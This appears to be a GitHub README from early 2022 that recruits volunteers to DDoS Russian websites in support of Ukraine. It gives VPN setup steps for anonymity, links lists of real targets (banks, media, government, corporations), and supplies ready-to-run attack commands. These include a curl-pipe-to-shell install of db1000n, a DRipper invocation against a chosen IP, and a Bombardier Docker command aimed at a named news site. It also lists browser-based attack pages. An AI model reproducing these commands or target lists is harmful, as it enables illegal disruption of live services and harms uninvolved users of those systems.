# Save Ukraine 🇺🇦

Russia has vilely attacked Ukraine on the morning of February 24, bombing peaceful cities with millions of people.

I've tried to compose a list of DDoS tools to help win this war on the informational front.

Our goals:
- Disrupt Russian propaganda websites and gov services
- Force people in Russia to protest against violent government policy
- Win this war

Last but not least [Русский корабль — иди нахуй!](https://www.youtube.com/watch?v=LDrFVdms8yk)

## VPN software

It's better to secure yourself with a VPN service. It makes you more anonymous, and you can switch to a different IP if yours get blocked.

I'll list here only ones that [have shown](https://macpaw.com/news/macpaw-amidst-aggression) support to Ukraine and provided temporary free access.

Ideally, choose a Russian IP, so you have fewer chances to be blocked.

### ClearVPN

1. Sign up on the website
2. Click on "Redeem a promocode"
3. Enter coupon code "SAVEUKRAINE"
4. Download the desktop app
5. Once installed, go back to the website and click "Auto-login"

### F-Secure FREEDOME VPN

1. Register using [this link](https://t.co/TekcNPxW9p) (copied from [here](https://twitter.com/fsecure/status/1497248407303462960))
2. Fill out your details and choose "Ukraine" as a country
3. Copy activation code
4. Download "F-Secure FREEDOME VPN" from [here](https://www.f-secure.com/en/home/download#freedome)
5. Once downloaded, go to "Subscriptions" -> "Activate subscription" and enter your license code

## List of targets

- [Banks and financial services](./targets/banks.txt)
- [Media propaganda resources](./targets/media.txt) 
- [Governmental and state resources](./targets/state.txt)
- [Business corporations](./targets/corporations.txt)
- [Other unsorted](./targets/unsorted.txt) (feel free to contribute)

## Checking availability

You can check the availability of target resources using these websites:

- https://globalcheck.net/ru
- https://check-host.net/check-ping
- https://ddosmonitor.herokuapp.com

## DDoS Tools

### [DB1000N](https://github.com/Arriven/db1000n)

**Shell-way (simplest)**

1. Run `curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | sh`
2. Run `./db1000n`

> See docs for other installation options.

### [DRipper](https://github.com/palahsu/DDoS-Ripper)

1. [Install python3](https://www.python.org/downloads/)
2. Run `git clone https://github.com/palahsu/DDoS-Ripper`
3. Run `python3 DRipper.py -s {IP} -p {PORT} -t 135` and put an IP that you want to attack

### [Bombardier](https://github.com/codesenberg/bombardier) (Docker)

**Installation (the simplest way)**

1. Install [Docker Desktop](https://www.docker.com/products/docker-desktop)
2. Open Terminal

**Single-target attack**

1. Run `docker run -ti --rm alpine/bombardier -c 1000 -d 9600s -l https://www.1tv.com/` (change URL to the one you want to attack)

> See [Bombardier docs](https://github.com/codesenberg/bombardier) for more options

**Multi-target attack**

1. Download `bombardier.sh`
2. Run `sudo chmod +x bombardier.sh`
3. Run `./bombardier.sh` to attack all targets
4. Run `./bombardier.sh banks` to attack specific category targets (see [targets](./targets))

## Browser-based DDoS

This approach doesn't require any technical knowledge, simply open the website and follow instructions.

- https://attack-ui.vercel.app/attack/ddos/start ([instructions](https://destiny-jumbo-8c6.notion.site/Attack-UI-5aebc8eaedcc47448b6d79fc4243d141))
- http://www.notwar.ho.ua/
- https://nowarukraine.online/
- https://vug.pl/takeRussiaDown.html
- https://cyber-yozh.com/
- https://playforukraine.live/

## Support Ukraine with a donation

Please support Ukraine to win this war. Every cent matters.

These are verified and government-supported funding websites:

1. https://uahelp.monobank.ua/
2. https://bank.gov.ua/en/news/all/natsionalniy-bank-vidkriv-spetsrahunok-dlya-zboru-koshtiv-na-potrebi-armiyi
3. https://putler.io/

You can also support with crypto ([source](https://t.me/zedigital/1107)):
- BTC: `357a3So9CbsNfBBgFYACGvxxS6tMaDoa1P` ([see balance](https://www.blockchain.com/btc/address/357a3So9CbsNfBBgFYACGvxxS6tMaDoa1P))
- ETH: `0x165CD37b4C644C2921454429E7F9358d18A45e14` ([see balance](https://etherscan.io/address/0x165CD37b4C644C2921454429E7F9358d18A45e14))
- USDT (TRC20): `TEFccmfQ38cZS1DTZVhsxKVDckA8Y6VfCy` ([see balance](https://usdt.tokenview.com/en/address/TEFccmfQ38cZS1DTZVhsxKVDckA8Y6VfCy))

## Join our IT army

1. [Official IT army Telegram channel](https://t.me/itarmyofukraine2022)
2. [Report vulnerabilities](http://t.me/stop_russian_war_bot) on Russian resources anonymously

## Any suggestions?

If you have something to add to the list, please submit a PR or write to comradefuckz@protonmail.com. 
